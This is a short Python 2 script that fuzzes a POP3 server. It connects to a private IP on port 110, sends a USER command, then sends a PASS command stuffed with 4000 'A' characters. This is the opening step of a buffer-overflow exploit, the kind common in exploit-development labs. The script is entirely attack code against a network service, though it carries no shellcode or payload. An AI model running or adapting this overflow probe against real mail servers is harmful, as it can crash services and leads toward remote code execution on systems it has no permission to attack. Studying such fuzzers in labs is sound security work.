#!/usr/bin/python

import socket

#Create array of buffers

buffer="A"*4000
counter=100

print "Fussing %s characters " % len(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.178.76', 110))
s.recv(1024)
s.send("USER test\r\n")
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()
